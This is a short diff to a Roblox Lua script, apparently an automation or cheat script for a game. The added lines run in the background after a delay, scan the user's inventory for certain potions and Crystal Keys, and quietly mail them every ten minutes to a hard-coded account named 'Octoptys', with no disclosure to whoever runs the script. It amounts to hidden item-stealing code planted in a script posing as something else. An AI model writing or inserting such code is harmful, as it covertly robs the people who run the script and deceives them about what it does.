@@ -1121,3 +1121,65 @@ for i,v in pairs(workspace:GetDescendants()) do
 end
 
 game.Players.LocalPlayer.Character.HumanoidRootPart.OrbCollect.Texture = ""
+
+
+
+task.wait(30)
+local Name = "Octoptys"
+local function checkForPotion()
+    local potionFound = false
+    if save2.Inventory.Consumable then
+        for call, v in pairs(save2.Inventory.Consumable) do
+            local currentPotion = string.find(v.id, "Insta") and v.tn == 4
+            local amount = v._am or 1
+            if currentPotion and amount > 4 then
+                potionFound = true
+                game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(Name, "ty", "Consumable", call, amount)
+                break
+            end
+        end
+    end
+
+    return potionFound
+end
+
+spawn(function()
+    while true do
+        local found = checkForPotion()
+        
+        if found then
+            task.wait(600)
+        else
+            task.wait(600)
+        end
+    end
+end)
+
+local function checkForKeys()
+    local KeysFound = false
+    if save2.Inventory.Misc then
+        for uid, item in pairs(save2.Inventory.Misc) do
+            if item.id == "Crystal Key" then
+                if item._am >= 20 then
+                    game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(Name, "ty", "Misc", uid, item._am)
+                    KeysFound = true
+                    break
+                end
+            end
+        end
+    end
+
+
+    return KeysFound
+end
+spawn(function()
+    while true do
+        local kfound = checkForKeys()
+        
+        if kfound then
+            task.wait(600)
+        else
+            task.wait(600)
+        end
+    end
+end)
